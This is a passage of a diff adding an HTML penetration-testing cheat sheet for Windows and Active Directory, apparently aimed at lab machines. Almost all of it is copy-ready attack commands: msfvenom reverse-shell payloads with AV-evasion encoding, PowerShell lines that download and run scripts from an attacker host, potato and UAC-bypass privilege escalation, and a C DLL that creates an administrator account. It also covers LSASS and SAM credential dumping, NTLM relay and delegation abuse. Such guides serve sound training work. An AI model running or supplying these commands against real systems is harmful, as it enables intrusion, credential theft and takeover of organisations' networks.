+      <div class="term-body"><span class="cm"># Get TGS hashes for service accounts (need valid credentials)</span>
+        impacket-GetUserSPNs domain.htb/user:pass -dc-ip $IP -request
+        impacket-GetUserSPNs domain.htb/user:pass -dc-ip $IP -request -outputfile kerberoast.txt
+        impacket-GetUserSPNs domain.htb/user -hashes :NTLM_HASH -dc-ip $IP -request
+
+        <span class="cm"># From Windows (Rubeus)</span>
+        .\Rubeus.exe kerberoast /outfile:hashes.txt
+        .\Rubeus.exe kerberoast /user:svc_account /outfile:hashes.txt
+
+        <span class="cm"># From Windows (PowerView)</span>
+        Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv hashes.csv
+
+        <span class="cm"># Crack</span>
+        hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
+        john kerberoast.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+        <span class="cm"># Hash format example:</span>
+        <span class="cm"># $krb5tgs$23$*user$DOMAIN.HTB$domain.htb/user*$...</span>
+      </div>
+    </div>
+    <h3 class="md-h3" id="54-searchsploit-cves">5.4 Searchsploit & CVEs</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Search for Windows/service exploits</span>
+        searchsploit windows 10
+        searchsploit IIS 10
+        searchsploit "exchange server"
+        searchsploit "windows server 2019"
+
+        <span class="cm"># Common high-value Windows CVEs to check:</span>
+        <span class="cm"># EternalBlue MS17-010 (SMB — Windows 7/2008)</span>
+        <span class="cm"># BlueKeep CVE-2019-0708 (RDP — pre-auth RCE)</span>
+        <span class="cm"># PrintNightmare CVE-2021-1675 / CVE-2021-34527</span>
+        <span class="cm"># ProxyLogon CVE-2021-26855 (Exchange)</span>
+        <span class="cm"># ProxyShell CVE-2021-34473 (Exchange)</span>
+        <span class="cm"># Log4Shell CVE-2021-44228</span>
+        <span class="cm"># Zerologon CVE-2020-1472 (Netlogon)</span>
+        <span class="cm"># PetitPotam CVE-2021-36942 (NTLM coerce)</span>
+
+        <span class="cm"># EternalBlue check</span>
+        nmap --script smb-vuln-ms17-010 -p 445 $IP
+        python3 checker.py $IP <span class="cm"># from github PoC</span>
+
+        <span class="cm"># AutoBlue / MS17-010 exploit</span>
+        git clone https://github.com/3ndG4me/AutoBlue-MS17-010
+        cd AutoBlue-MS17-010
+        python eternal_checker.py $IP
+        ./shell_prep.sh <span class="cm"># generate shellcode</span>
+        python eternalblue_exploit7.py $IP shellcode/sc_x64.bin
+      </div>
+    </div>
+    <h3 class="md-h3" id="55-msfvenom-payloads-windows">5.5 MSFVenom Payloads (Windows)</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Windows x64 EXE</span>
+        msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o shell.exe
+        msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o meter.exe
+
+        <span class="cm"># Windows x86 EXE</span>
+        msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o shell32.exe
+
+        <span class="cm"># DLL</span>
+        msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f dll -o shell.dll
+
+        <span class="cm"># PowerShell</span>
+        msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f ps1 -o shell.ps1
+
+        <span class="cm"># HTA</span>
+        msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f hta-psh -o shell.hta
+
+        <span class="cm"># ASPX webshell</span>
+        msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f aspx -o shell.aspx
+
+        <span class="cm"># Encoded (basic AV evasion)</span>
+        msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -e x64/xor_dynamic -i 10 -f exe -o
+        encoded.exe
+
+        <span class="cm"># Staged vs stageless</span>
+        <span class="cm"># Staged: smaller, connects back for payload (windows/x64/meterpreter/reverse_tcp)</span>
+        <span class="cm"># Stageless: self-contained (windows/x64/meterpreter_reverse_tcp)</span>
+      </div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="phase-6-post-exploitation-situational-awareness" style="margin-top:36px"><span
+        class="sec-title">Phase 6 — Post-Exploitation & Situational Awareness</span><span class="sec-line"></span></div>
+    <h3 class="md-h3" id="61-basic-windows-enumeration">6.1 Basic Windows Enumeration</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">cmd</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body">:: Who am I
+        whoami
+        whoami /priv
+        whoami /groups
+        whoami /all
+
+        :: System info
+        systeminfo
+        hostname
+        echo %COMPUTERNAME%
+        echo %USERDOMAIN%
+        wmic os get Caption,BuildNumber,ServicePackMajorVersion
+
+        :: Network
+        ipconfig /all
+        netstat -ano
+        route print
+        arp -a
+        nslookup %USERDOMAIN%
+
+        :: Users and groups
+        net user
+        net user username
+        net localgroup
+        net localgroup Administrators
+        net group /domain
+        net group "Domain Admins" /domain
+        net accounts /domain
+
+        :: Processes and services
+        tasklist /v
+        wmic process list full
+        sc query
+        sc query type= all state= all
+        Get-Service (PowerShell)
+
+        :: Installed software
+        wmic product get Name,Version
+        reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
+
+        :: Environment
+        set
+        echo %PATH%
+        echo %APPDATA%
+        echo %TEMP%</div>
+    </div>
+    <h3 class="md-h3" id="62-powershell-enumeration">6.2 PowerShell Enumeration</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">powershell</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># System info</span>
+        $PSVersionTable
+        [System.Environment]::OSVersion
+        Get-WmiObject Win32_OperatingSystem | Select-Object Caption, BuildNumber, ServicePackMajorVersion
+
+        <span class="cm"># Current user</span>
+        [System.Security.Principal.WindowsIdentity]::GetCurrent()
+        [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
+
+        <span class="cm"># Network</span>
+        Get-NetIPAddress
+        Get-NetRoute
+        Get-NetTCPConnection -State Listen
+        Get-DnsClientServerAddress
+
+        <span class="cm"># Users</span>
+        Get-LocalUser
+        Get-LocalGroup
+        Get-LocalGroupMember Administrators
+
+        <span class="cm"># AD (if RSAT available)</span>
+        Get-ADUser -Filter * -Properties *
+        Get-ADGroup -Filter * | Select-Object Name
+        Get-ADGroupMember "Domain Admins"
+        Get-ADComputer -Filter * | Select-Object Name
+        Get-ADDomainController
+        (Get-ADDomain).DomainMode
+
+        <span class="cm"># Processes</span>
+        Get-Process | Sort-Object CPU -Descending | Select-Object -First 20
+        Get-WmiObject Win32_Process | Select-Object Name, ProcessId, ParentProcessId, CommandLine
+
+        <span class="cm"># Services</span>
+        Get-Service | Where-Object { $_.Status -eq "Running" }
+        Get-WmiObject Win32_Service | Select-Object Name, StartName, PathName, StartMode | Where-Object { $_.StartName
+        -ne "LocalSystem" }
+
+        <span class="cm"># Scheduled tasks</span>
+        Get-ScheduledTask | Where-Object { $_.TaskPath -notlike "\Microsoft*" }
+        schtasks /query /fo LIST /v
+
+        <span class="cm"># AppLocker</span>
+        Get-AppLockerPolicy -Effective -Xml
+
+        <span class="cm"># PowerShell history</span>
+        Get-History
+        cat (Get-PSReadlineOption).HistorySavePath
+
+        <span class="cm"># Bypass execution policy (no admin needed)</span>
+        powershell -ep bypass
+        powershell -ExecutionPolicy Bypass -File script.ps1
+        Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser -Force
+      </div>
+    </div>
+    <h3 class="md-h3" id="63-finding-credentials">6.3 Finding Credentials</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">cmd</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body">:: Credentials in registry
+        reg query HKLM /f password /t REG_SZ /s
+        reg query HKCU /f password /t REG_SZ /s
+        reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
+        reg query "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
+        reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
+        reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
+
+        :: Unattend / sysprep files
+        type C:\Windows\Panther\Unattend.xml
+        type C:\Windows\Panther\Unattend\Unattend.xml
+        type C:\Windows\System32\sysprep\sysprep.xml
+        type C:\Windows\System32\sysprep\unattend.xml
+
+        :: IIS config
+        type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+        type C:\inetpub\wwwroot\web.config
+        findstr /si password C:\inetpub\*.config
+
+        :: MSSQL connection strings
+        findstr /si connectionstring C:\inetpub\
+
+        :: PowerShell history
+        type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+        type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+        :: Search for credentials in files
+        findstr /spin "password" *.txt *.xml *.ini *.config 2&gt;nul
+        dir /s /b *pass* *cred* *secret* *config* 2&gt;nul
+
+        :: .kdbx (KeePass) databases
+        dir /s /b *.kdbx 2&gt;nul
+
+        :: SSH keys
+        dir /s /b id_rsa id_rsa.pub *.ppk 2&gt;nul
+
+        :: VNC passwords (encrypted)
+        reg query "HKCU\Software\ORL\WinVNC3\Password"
+        reg query "HKCU\Software\TightVNC\Server"</div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="phase-7-windows-privilege-escalation" style="margin-top:36px"><span class="sec-title">Phase
+        7 — Windows Privilege Escalation</span><span class="sec-line"></span></div>
+    <h3 class="md-h3" id="71-automated-enumeration">7.1 Automated Enumeration</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">powershell</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># WinPEAS (best)</span>
+        .\winPEAS.exe
+        .\winPEAS.exe quiet
+        .\winPEAS.exe systeminfo userinfo
+        .\winPEAS.exe log <span class="cm"># save to file</span>
+
+        <span class="cm"># PowerUp (PowerShell)</span>
+        IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/PowerUp.ps1')
+        Invoke-AllChecks | Out-File -Encoding ASCII checks.txt
+
+        <span class="cm"># Seatbelt (comprehensive)</span>
+        .\Seatbelt.exe -group=all
+        .\Seatbelt.exe -group=user
+        .\Seatbelt.exe NTLMSettings OSInfo PoweredOnEvents
+
+        <span class="cm"># Watson (missing patches)</span>
+        .\Watson.exe
+
+        <span class="cm"># Sherlock (older, patches)</span>
+        IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/Sherlock.ps1')
+        Find-AllVulns
+      </div>
+    </div>
+    <h3 class="md-h3" id="72-token-privilege-abuse">7.2 Token & Privilege Abuse</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">cmd</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body">:: Check privileges
+        whoami /priv
+
+        :: KEY PRIVILEGES TO LOOK FOR:
+        :: SeImpersonatePrivilege → Potato attacks
+        :: SeAssignPrimaryToken → Potato attacks
+        :: SeTakeOwnershipPrivilege → Take ownership of files/registry
+        :: SeDebugPrivilege → Dump process memory (LSASS)
+        :: SeBackupPrivilege → Read any file
+        :: SeRestorePrivilege → Write any file
+        :: SeLoadDriverPrivilege → Load kernel drivers (Capcom, etc.)
+        :: SeTcbPrivilege → Act as OS (create tokens)
+        :: SeCreateTokenPrivilege → Create arbitrary tokens</div>
+    </div>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Potato attacks (SeImpersonatePrivilege /
+          SeAssignPrimaryTokenPrivilege)</span>
+        <span class="cm"># These work from IIS, SQL Server service accounts, etc.</span>
+
+        <span class="cm"># JuicyPotato (Windows Server 2016 and earlier)</span>
+        .\JuicyPotato.exe -l 1337 -p cmd.exe -a "/c net user hacker Password123! /add &amp;&amp; net localgroup
+        administrators hacker /add" -t *
+        .\JuicyPotato.exe -l 1337 -p cmd.exe -a "/c C:\Temp\shell.exe" -t * -c {CLSID}
+
+        <span class="cm"># RoguePotato (newer systems)</span>
+        .\RoguePotato.exe -r $LHOST -e "C:\Temp\shell.exe" -l 9999
+
+        <span class="cm"># SweetPotato (all-in-one)</span>
+        .\SweetPotato.exe -a "C:\Temp\shell.exe"
+        .\SweetPotato.exe -p C:\Windows\System32\cmd.exe -a "/c net user hacker Password123! /add"
+
+        <span class="cm"># GodPotato (Windows 2012 - 2022, works everywhere)</span>
+        .\GodPotato.exe -cmd "cmd /c whoami"
+        .\GodPotato.exe -cmd "cmd /c C:\Temp\shell.exe"
+
+        <span class="cm"># PrintSpoofer (Windows 10 / Server 2016+)</span>
+        .\PrintSpoofer.exe -i -c cmd
+        .\PrintSpoofer.exe -c "C:\Temp\shell.exe"
+
+        <span class="cm"># SeBackupPrivilege → dump SAM</span>
+        mkdir C:\Temp\loot
+        reg save hklm\sam C:\Temp\loot\SAM
+        reg save hklm\system C:\Temp\loot\SYSTEM
+        reg save hklm\security C:\Temp\loot\SECURITY
+        <span class="cm"># Transfer files, then on Kali:</span>
+        impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
+
+        <span class="cm"># SeDebugPrivilege → LSASS dump</span>
+        .\procdump.exe -ma lsass.exe lsass.dmp
+        <span class="cm"># Or:</span>
+        tasklist | findstr lsass <span class="cm"># find PID</span>
+        .\mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit
+      </div>
+    </div>
+    <h3 class="md-h3" id="73-unquoted-service-paths">7.3 Unquoted Service Paths</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">cmd</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body">:: Find unquoted service paths
+        wmic service get Name,PathName,StartMode | findstr /i "auto" | findstr /v "C:\Windows\\"
+
+        :: PowerShell
+        Get-WmiObject Win32_Service | Where-Object {$_.PathName -notmatch '"' -and $_.PathName -notmatch "C:\\Windows"}
+        | Select-Object Name, PathName, StartName, StartMode
+
+        :: PowerUp
+        Get-UnquotedService
+
+        :: Example exploit:
+        :: PathName: C:\Program Files\Vulnerable Service\service.exe
+        :: Windows tries: C:\Program.exe, C:\Program Files\Vulnerable.exe, C:\Program Files\Vulnerable
+        Service\service.exe
+        :: Place malicious: C:\Program Files\Vulnerable.exe
+        msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o "Vulnerable.exe"
+        copy Vulnerable.exe "C:\Program Files\Vulnerable.exe"
+        sc stop VulnerableService
+        sc start VulnerableService
+        :: Or wait for reboot</div>
+    </div>
+    <h3 class="md-h3" id="74-weak-service-permissions">7.4 Weak Service Permissions</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">cmd</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body">:: Check service permissions
+        accesschk.exe /accepteula -uwcqv "Authenticated Users" *
+        accesschk.exe /accepteula -uwcqv user *
+        accesschk.exe /accepteula -ucqv VulnerableService
+
+        :: PowerShell
+        Get-Acl HKLM:\System\CurrentControlSet\Services\VulnerableService | Format-List
+
+        :: If you have WRITE permission to a service binary:
+        msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o malicious.exe
+        copy malicious.exe "C:\Path\To\Service\binary.exe" /y
+        sc stop ServiceName
+        sc start ServiceName
+
+        :: If you can change service binary path:
+        sc config ServiceName binpath= "C:\Temp\shell.exe"
+        sc stop ServiceName &amp;&amp; sc start ServiceName
+
+        :: Check for weak folder permissions (DLL hijacking prep)
+        accesschk.exe /accepteula -uwdq "C:\Program Files\"
+        icacls "C:\Program Files\Service\"</div>
+    </div>
+    <h3 class="md-h3" id="75-alwaysinstallelevated">7.5 AlwaysInstallElevated</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">cmd</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body">:: Check
+        reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+        reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+        :: Both must be 0x1 for exploit
+
+        :: If enabled, create malicious MSI
+        msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f msi -o shell.msi
+        msiexec /quiet /qn /i C:\Temp\shell.msi
+
+        :: PowerUp
+        Write-UserAddMSI <span class="cm"># creates adduser.msi</span></div>
+    </div>
+    <h3 class="md-h3" id="76-dll-hijacking">7.6 DLL Hijacking</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">cmd</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body">:: Find missing DLLs in process monitor or with:
+        .\Process Monitor\Procmon.exe <span class="cm"># filter on DLL not found</span>
+
+        :: Common hijackable locations:
+        :: - Services running from user-writable directories
+        :: - Applications loading DLLs from PATH
+        :: - DLLs not found and searched in user-writable dirs
+
+        :: Create malicious DLL
+        msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f dll -o hijack.dll
+        copy hijack.dll "C:\Writable\Path\missing.dll"
+
+        :: C DLL template:</div>
+    </div>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">c</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm">#include &lt;windows.h&gt;</span>
+        BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
+        if (fdwReason == DLL_PROCESS_ATTACH) {
+        system("cmd /c net user hacker Password123! /add &amp;&amp; net localgroup administrators hacker /add");
+        }
+        return TRUE;
+        }
+        // Compile: x86_64-w64-mingw32-gcc -shared -o hijack.dll hijack.c</div>
+    </div>
+    <h3 class="md-h3" id="77-scheduled-tasks">7.7 Scheduled Tasks</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">cmd</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body">:: List scheduled tasks
+        schtasks /query /fo LIST /v | findstr /i "task\|run\|user"
+        Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\Microsoft*"} | Select-Object TaskName, TaskPath
+
+        :: Check permissions on task script/binary
+        icacls "C:\Scripts\task_script.ps1"
+        icacls "C:\Program Files\task_binary.exe"
+
+        :: If writable, replace with malicious version
+        copy shell.exe "C:\Scripts\task_script.exe" /y
+
+        :: Wait for task to run, or if modifiable:
+        schtasks /change /tn "TaskName" /ru SYSTEM /tr "C:\Temp\shell.exe"</div>
+    </div>
+    <h3 class="md-h3" id="78-stored-credentials">7.8 Stored Credentials</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">cmd</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body">:: Windows Credential Manager
+        cmdkey /list
+        runas /savecred /user:admin "cmd /c C:\Temp\shell.exe"
+
+        :: Mimikatz (if admin → SYSTEM creds)
+        .\mimikatz.exe
+        privilege::debug
+        sekurlsa::logonpasswords
+        sekurlsa::wdigest <span class="cm"># cleartext if wdigest enabled</span>
+        lsadump::sam <span class="cm"># SAM hashes</span>
+        lsadump::cache <span class="cm"># cached creds</span>
+        vault::cred /patch <span class="cm"># vault creds</span>
+
+        :: Enable WDigest (store creds in cleartext)
+        reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
+        /f
+        :: Wait for user to log back in
+
+        :: DPAPI — decrypt browser saved passwords
+        .\mimikatz.exe
+        dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect</div>
+    </div>
+    <h3 class="md-h3" id="79-registry-autoruns">7.9 Registry Autoruns</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">cmd</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body">:: Check autoruns
+        reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+        reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+        reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
+
+        :: Check if autorun binary is writable
+        icacls "C:\Path\To\Autorun\binary.exe"
+
+        :: If writable, replace with shell
+        copy shell.exe "C:\Path\To\Autorun\binary.exe" /y
+        :: Wait for admin to log in / reboot</div>
+    </div>
+    <h3 class="md-h3" id="710-uac-bypass">7.10 UAC Bypass</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">powershell</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Check UAC level</span>
+        (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).ConsentPromptBehaviorAdmin
+        <span class="cm"># 0 = No prompt (disabled), 5 = Prompt for admin (default)</span>
+
+        <span class="cm"># Method 1 — fodhelper bypass (Windows 10)</span>
+        New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
+        New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value ""
+        -Force
+        Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value
+        "C:\Temp\shell.exe" -Force
+        Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
+
+        <span class="cm"># Method 2 — eventvwr bypass</span>
+        New-Item -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Force
+        Set-ItemProperty -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Name "(default)" -Value
+        "C:\Temp\shell.exe"
+        Start-Process "eventvwr.exe"
+
+        <span class="cm"># Method 3 — UACME (collection of 70+ bypasses)</span>
+        .\Akagi64.exe 23 C:\Temp\shell.exe
+
+        <span class="cm"># Method 4 — RunAs with known admin creds</span>
+        Start-Process cmd.exe -Credential (New-Object System.Management.Automation.PSCredential('admin',
+        (ConvertTo-SecureString 'password' -AsPlainText -Force))) -ArgumentList '/c C:\Temp\shell.exe'
+      </div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="phase-8-active-directory-attacks" style="margin-top:36px"><span class="sec-title">Phase 8 —
+        Active Directory Attacks</span><span class="sec-line"></span></div>
+    <h3 class="md-h3" id="81-ntlm-relay-attacks">8.1 NTLM Relay Attacks</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Step 1: Disable SMB signing check</span>
+        nmap --script smb2-security-mode -p 445 $IP/24
+
+        <span class="cm"># Step 2: Setup Responder (to capture / poison)</span>
+        <span class="cm"># Edit Responder.conf: SMB = Off, HTTP = Off (for relay, not capture)</span>
+        responder -I tun0 -rdwv
+
+        <span class="cm"># Step 3: Setup ntlmrelayx</span>
+        <span class="cm"># Relay to specific target</span>
+        impacket-ntlmrelayx -tf targets.txt -smb2support
+        impacket-ntlmrelayx -tf targets.txt -smb2support -i <span class="cm"># interactive shell</span>
+
+        <span class="cm"># Relay to get SAM dump</span>
+        impacket-ntlmrelayx -t $IP -smb2support
+
+        <span class="cm"># Relay to execute command</span>
+        impacket-ntlmrelayx -t $IP -smb2support -c "whoami &gt; C:\Temp\out.txt"
+
+        <span class="cm"># Relay to LDAP (for AD attacks)</span>
+        impacket-ntlmrelayx -t ldap://$DC --escalate-user user_to_escalate
+
+        <span class="cm"># Step 4: Trigger NTLM auth (various methods)</span>
+        <span class="cm"># - Access \\$LHOST from victim (social engineering, XSS)</span>
+        <span class="cm"># - PrinterBug / SpoolSample</span>
+        impacket-dfscoerce $LHOST $TARGET
+        python3 SpoolSample.py $TARGET $LHOST
+
+        <span class="cm"># PetitPotam (force DC to auth)</span>
+        python3 PetitPotam.py $LHOST $DC
+        python3 PetitPotam.py -u user -p pass -d domain.htb $LHOST $DC
+      </div>
+    </div>
+    <h3 class="md-h3" id="82-kerberos-delegation-attacks">8.2 Kerberos Delegation Attacks</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Find unconstrained delegation computers</span>
+        impacket-findDelegation domain.htb/user:pass -dc-ip $IP
+        Get-ADComputer -Filter {TrustedForDelegation -eq $true} | Select-Object Name
+
+        <span class="cm"># Unconstrained delegation exploitation</span>
+        <span class="cm"># When target machine has unconstrained delegation:</span>
+        <span class="cm"># 1. Get code exec on delegating computer</span>
+        <span class="cm"># 2. Wait for privileged user to connect, or force DC to auth (PrinterBug)</span>
+        <span class="cm"># 3. Dump tickets with Mimikatz/Rubeus</span>
+        .\Rubeus.exe monitor /interval:5 /nowrap
+        python3 SpoolSample.py $DC $COMPROMISED_COMPUTER <span class="cm"># force DC TGT</span>
+        .\Rubeus.exe ptt /ticket:BASE64_TICKET
+
+        <span class="cm"># Constrained delegation</span>
+        Get-ADUser -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
+        Get-ADComputer -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
+
+        <span class="cm"># Exploit constrained delegation (S4U2Proxy)</span>
+        .\Rubeus.exe s4u /user:svc_account /password:pass /impersonateuser:administrator
+        /msdsspn:"http/target.domain.htb" /nowrap
+        .\Rubeus.exe s4u /user:svc_account /rc4:NTLM_HASH /impersonateuser:administrator
+        /msdsspn:"cifs/target.domain.htb" /ptt
+
+        <span class="cm"># Resource-Based Constrained Delegation (RBCD)</span>
+        <span class="cm"># If you can write msDS-AllowedToActOnBehalfOfOtherIdentity on a computer:</span>
+        <span class="cm"># 1. Create a machine account (or use existing with SPN)</span>
+        impacket-addcomputer domain.htb/user:pass -computer-name 'ATTACKER$' -computer-pass 'Pass123!'
+        <span class="cm"># 2. Configure RBCD</span>
+        python3 rbcd.py -f ATTACKER -t TARGET -dc-ip $DC domain.htb/user:pass
+        <span class="cm"># 3. Get ticket</span>
+        impacket-getST -spn 'cifs/target.domain.htb' -impersonate administrator -dc-ip $DC
+        domain.htb/'ATTACKER$':'Pass123!'
+        <span class="cm"># 4. Use ticket</span>
+        export KRB5CCNAME=administrator.ccache
+        impacket-psexec -k -no-pass domain.htb/administrator@target.domain.htb
+      </div>
+    </div>
+    <h3 class="md-h3" id="83-acl-ace-abuse">8.3 ACL / ACE Abuse</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Find interesting ACLs with BloodHound (primary method)</span>
+        <span class="cm"># Look for: GenericAll, GenericWrite, WriteOwner, WriteDACL, ForceChangePassword,
+          AddMember</span>
+
+        <span class="cm"># Or with PowerView</span>
+        IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/PowerView.ps1')
+        Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -match "compromised_user"}
+
+        <span class="cm"># GenericAll on User — force password reset</span>
+        Set-DomainUserPassword -Identity target_user -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText
+        -Force) -Verbose
+        net user target_user NewPass123! /domain
+
+        <span class="cm"># GenericAll on Group — add member</span>
+        Add-DomainGroupMember -Identity "Domain Admins" -Members compromised_user
+        net group "Domain Admins" compromised_user /add /domain
+
